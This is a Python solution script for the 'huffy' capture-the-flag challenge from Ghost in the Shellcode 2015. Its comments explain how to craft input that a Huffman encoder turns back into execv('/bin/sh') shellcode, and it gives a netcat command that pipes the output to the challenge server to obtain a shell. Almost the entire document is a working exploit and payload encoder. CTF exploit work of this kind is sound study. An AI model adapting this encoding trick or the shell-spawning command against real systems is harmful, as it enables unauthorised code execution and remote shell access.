#!/usr/bin/env python3
#
# Solution for 'huffy' - GITS 2015
#
# To get a shell on the CTF server:
#  (./huffy.py shellcode.raw; cat) | nc huffy.2015.ghostintheshellcode.com 8143
#
# shellcode.raw just contains simple execv("/bin/sh") shellcode:
# http://shell-storm.org/shellcode/files/shellcode-827.php
#
# Basic Idea:
# The huffman code is deterministic: Given input with the same
# relative frequency deistribution it will produce the same code (same tree).
# We need a huffman code where all paths have length 4 (so we can encode
# every possible byte), we can produce such a code by using a more or less
# uniform distribution. We save the absolute frequency distribution that
# produced the code.
# With that we are able to first decode our input using the huffman code
# (so it will encode to our shellcode again on the server), then choose the remaining
# bytes so that we will end up with the same frequency distribution we used above.
#

import sys
from binascii import unhexlify

if len(sys.argv) < 2:
    print("Usage: {} shellcode.raw".format(sys.argv[0]))
    sys.exit(0)

shellcode = open(sys.argv[1], 'rb').read()

# 'want' is the absolute distribution we want at the end to get the huffman code below.
# It was produces by using the following as input (truncated to 1000 bytes):
# for i in range(256*4):
#     sys.stdout.write(chr(i % 256))
# Other distributions will work as well as long as all paths have length 4.
want = [127, 127, 127, 127, 127, 127, 127, 127, 126, 126, 126, 126, 126, 126, 118, 110]
# If you grab the code from the program output be sure read from the root to the child nodes (right to left).
huffman = [0b1000, 0b1100, 0b1110, 0b1010, 0b1011, 0b1111, 0b1101, 0b1001, 0b0010, 0b0100, 0b0110, 0b0111, 0b0101, 0b0011, 0b0001, 0b0000]

result = ''

# decode our shellcode using the huffman code above ..
for b in shellcode:
    highnibble = b >> 4
    lownibble  = b & 0xf
    result += '{:x}{:x}'.format(huffman.index(highnibble), huffman.index(lownibble))

# .. and choose the remaining bytes so that we get the correct frequency distribution
for i, v in enumerate(want):
    r = v - result.count('{:x}'.format(i))
    if r < 0:
        print("Given input can not be encoded, sorry")
        sys.exit(-1)
    result += r * '{:x}'.format(i)

# all done :)
sys.stdout.buffer.write(unhexlify(result))
